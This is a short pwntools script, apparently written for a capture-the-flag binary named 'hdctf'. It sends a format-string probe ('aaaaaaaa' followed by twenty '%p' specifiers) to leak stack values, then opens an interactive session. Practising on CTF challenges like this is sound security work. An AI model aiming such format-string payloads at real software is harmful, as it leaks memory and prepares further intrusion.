from pwn import *

io = process("./hdctf")

payload = b"aaaaaaaa" + b" %p" * 20

io.send(payload)

io.interactive()
